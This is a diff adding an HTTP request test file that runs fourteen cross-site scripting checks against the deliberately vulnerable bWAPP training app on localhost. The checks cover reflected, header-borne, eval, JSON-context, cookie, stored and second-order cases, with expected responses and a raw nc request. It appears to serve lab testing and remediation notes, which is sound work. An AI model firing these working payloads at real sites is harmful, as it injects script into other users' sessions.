@@ -1,0 +1,194 @@
+### ============================================================================
+### 02 - A7 Cross-Site Scripting (XSS)
+###   Every reflected sink below writes attacker input straight into the HTML
+###   with no encoding at security level 0 (functions_external.php::no_check).
+###
+###   Reflected sinks: xss_get.php, xss_post.php, xss_referer.php,
+###                    xss_user_agent.php, xss_href-2.php, xss_php_self.php,
+###                    xss_custom_header.php, xss_json.php, xss_eval.php
+###   Stored sinks:    xss_stored_1.php (blog), user_extra.php -> xss_stored_2.php
+###   Cookie sink:     smgmt_cookies_httponly.php echoes $_COOKIE["top_security"]
+### ============================================================================
+
+### ---------------------------------------------------------------------------
+### XSS-01  Reflected, GET parameters (xss_get.php)
+###   Marker to look for in the response:  <script>alert(1)</script>
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/xss_get.php?firstname=%3Cscript%3Ealert(1)%3C%2Fscript%3E&lastname=x HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, the raw <script> tag is echoed back unencoded
+
+
+### ---------------------------------------------------------------------------
+### XSS-02  Reflected, POST parameters (xss_post.php)
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/xss_post.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+firstname=%3Cscript%3Ealert(1)%3C%2Fscript%3E&lastname=x&form=submit
+### Expected: 200, raw <script> tag in the "Welcome ..." line
+
+
+### ---------------------------------------------------------------------------
+### XSS-03  Reflected via the Referer request header (xss_referer.php)
+###   Any inbound request header is a reflection sink, so header-based WAF
+###   rules that only inspect the body will miss this.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/xss_referer.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Referer: <script>alert(1)</script>
+### Expected: 200, payload reflected into the page
+
+
+### ---------------------------------------------------------------------------
+### XSS-04  Reflected via the User-Agent header (xss_user_agent.php)
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/xss_user_agent.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+User-Agent: <script>alert(1)</script>
+### Expected: 200, payload reflected into the page
+
+
+### ---------------------------------------------------------------------------
+### XSS-05  Reflected into a custom request header (xss_custom_header.php)
+###   The page iterates getallheaders() and echoes only the one literally named
+###   "bWAPP" - a header that no browser UI lets you set, which is exactly why
+###   this class of bug is easy to miss in a manual review.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/xss_custom_header.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+bWAPP: <script>alert(1)</script>
+### Expected: 200, "<i><script>alert(1)</script></i>" in the output
+
+
+### ---------------------------------------------------------------------------
+### XSS-06  $_SERVER["PHP_SELF"] - payload in the URL PATH, not a parameter
+###   This is the classic "PHP_SELF is attacker-controlled" bug. The payload
+###   sits after the .php suffix and before the query string, so no query
+###   string parser or input filter ever sees it.
+###   Verified by hand: the response contains
+###     <form action="/xss_php_self.php/<script>alert(1)</script>" method="GET">
+###   so the payload escapes the quoted attribute and executes.
+###   Two Apache behaviours worth recording:
+###     - a PATH_INFO containing an encoded double quote (%22) is answered 404,
+###       so the usual %22%3E attribute-breakout prefix does not work here; the
+###       bug does not need it, PHP_SELF already lands in a quoted attribute
+###       with no encoding applied.
+###     - a PATH_INFO with LITERAL < and > is also answered 404.
+###   NOT SENT BY THE RUNNER: .NET's System.Uri unescapes %3C/%3E before the
+###   request line is written, which turns the encoded payload into the literal
+###   one that Apache rejects. Send it with a raw client:
+###     printf 'GET /xss_php_self.php/%%3Cscript%%3Ealert(1)%%3C/script%%3E?firstname=a&lastname=b&form=submit HTTP/1.1\r\nHost: localhost:8080\r\nCookie: PHPSESSID=<id>\r\nConnection: close\r\n\r\n' | nc localhost 8080
+###   In a browser, just visit the URL - this is a live, exploitable XSS.
+### ---------------------------------------------------------------------------
+### SKIP
+### RUNNER-CANNOT-SEND: System.Uri unescapes the encoded payload in the path
+GET {{baseUrl}}/xss_php_self.php/%3Cscript%3Ealert(1)%3C%2Fscript%3E?firstname=a&lastname=b&form=submit HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### EXPECT-STATUS: 200
+### EXPECT-BODY: <form action="/xss_php_self.php/<script>alert(1)</script>"
+### Expected: 200, the <form action="..."> attribute is broken out of
+
+
+### ---------------------------------------------------------------------------
+### XSS-07  Reflected inside an <a href> (xss_href-1.php -> xss_href-2.php)
+###   xss_href-1.php just renders a form; the reflection lands on href-2.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/xss_href-2.php?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E&action=vote HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, payload reflected in the vote page
+
+
+### ---------------------------------------------------------------------------
+### XSS-08  eval() sink (xss_eval.php)
+###   Server-side: eval("document.write(" . xss($_GET["date"]) . ")")
+###   Breaking out of the write() call gives script execution in the browser.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/xss_eval.php?date=1)%3Balert(1)%3B%2F%2F HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, the emitted script reads: document.write(1);alert(1);//)
+
+
+### ---------------------------------------------------------------------------
+### XSS-09  JSON context injection (xss_json.php)
+###   The response is embedded in a JS string literal:
+###     var JSONResponseString = '<?php echo $string ?>';
+###   Breaking the string literal escapes into arbitrary JS.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/xss_json.php?title=%27%3Balert(1)%3B%2F%2F&action=search HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, JSONResponseString contains ';alert(1);//'
+
+
+### ---------------------------------------------------------------------------
+### XSS-10  STORED XSS via the blog (xss_stored_1.php)
+###   The submit button is `blog`, and entry_add / entry_all are checkboxes -
+###   send entry_add=on and entry_all=on or the entry is never rendered back.
+###   Persistence means this fires for EVERY later visitor, not just the author.
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/xss_stored_1.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+entry=%3Cscript%3Ealert(%22xss-stored-1%22)%3C%2Fscript%3E&blog=submit&entry_add=on&entry_all=on
+### Expected: 200, "xss-stored-1" appears in the blog listing below the form
+### Impact: any authenticated user who loads the blog now executes this
+
+
+### ---------------------------------------------------------------------------
+### XSS-11  STORED XSS via the user profile, fired on another page
+###   Step 1 of 2: poison the profile (user_extra.php writes firstname/lastname).
+### ---------------------------------------------------------------------------
+POST {{baseUrl}}/user_extra.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+Content-Type: application/x-www-form-urlencoded
+
+firstname=%3Cscript%3Ealert(%22stored2%22)%3C%2Fscript%3E&lastname=x&action=add&form=submit
+### Expected: 200, profile updated without complaint
+
+
+### ---------------------------------------------------------------------------
+### XSS-12  STORED XSS step 2 of 2 - trigger it from an unrelated page
+###   This is second-order XSS: the payload is written in one request and
+###   executed in a completely different request/context.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/xss_stored_2.php?genre=action&form=like HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, the stored name is rendered and the script executes
+
+
+### ---------------------------------------------------------------------------
+### XSS-13  Reflected XSS through a COOKIE (smgmt_cookies_httponly.php)
+###   The page echoes $_COOKIE["top_security"] with no encoding. Because the
+###   value comes from a cookie, a single malicious Set-Cookie (from a sibling
+###   subdomain, or over plaintext HTTP) becomes a persistent XSS.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/smgmt_cookies_httponly.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}; top_security=<script>alert("cookie")</script>
+### Expected: 200, the cookie value is echoed as live markup
+
+
+### ---------------------------------------------------------------------------
+### XSS-14  Context: what the "medium" security level actually does
+###   Re-send XSS-01 while the security_level cookie says 1. bWAPP applies
+###   htmlspecialchars-style filtering from functions_external.php, so the
+###   payload comes back encoded. Useful for the remediation section.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/xss_get.php?firstname=%3Cscript%3Ealert(1)%3C%2Fscript%3E&lastname=x HTTP/1.1
+Host: localhost:8080
+Cookie: PHPSESSID={{session}}; security_level=1
+### Expected: 200, payload arrives as &lt;script&gt; - inert
